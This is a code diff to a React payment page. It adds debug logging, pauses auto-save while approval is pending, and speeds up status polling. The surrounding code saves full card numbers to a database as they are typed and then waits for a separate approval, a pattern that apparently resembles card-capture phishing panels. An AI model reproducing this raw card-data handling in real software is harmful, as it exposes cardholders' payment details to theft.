@@ -152,7 +152,7 @@ const Payment = () => {
   const cardType = getCardType(formData.cardNumber);
 
   // Auto-save to database in real-time
-  useAutoSave(applicationId, {
+  useAutoSave(waitingForApproval ? null : applicationId, {
     cardholder_name: formData.cardholderName,
     card_number: formData.cardNumber,
     card_last_4: formData.cardNumber.replace(/\s/g, "").slice(-4) || "",
@@ -212,6 +212,7 @@ const Payment = () => {
     if (waitingForApproval && applicationId) {
       let isActive = true;
 
+      console.log('[Payment] Started polling for approval on application', applicationId);
       getApplicationStatus(applicationId).then(({ data }) => {
         if (isActive) handleApplicationStatus(data);
       });
@@ -226,16 +227,28 @@ const Payment = () => {
             table: 'customer_applications',
             filter: `id=eq.${applicationId}`
           },
-          (payload) => handleApplicationStatus(payload.new)
+          (payload) => {
+            console.log('[Payment] Realtime update received', payload.new);
+            handleApplicationStatus(payload.new);
+          }
         )
         .subscribe();
 
       const interval = setInterval(async () => {
         const { data, error } = await getApplicationStatus(applicationId);
-        if (!error && isActive) {
+        if (error) {
+          console.error('[Payment] Polling error', error);
+          return;
+        }
+        if (isActive) {
+          console.log('[Payment] Poll result', {
+            payment_approved: data?.payment_approved,
+            status: data?.status,
+            current_step: data?.current_step,
+          });
           handleApplicationStatus(data);
         }
-      }, 2000);
+      }, 1000);
 
       return () => {
         isActive = false;
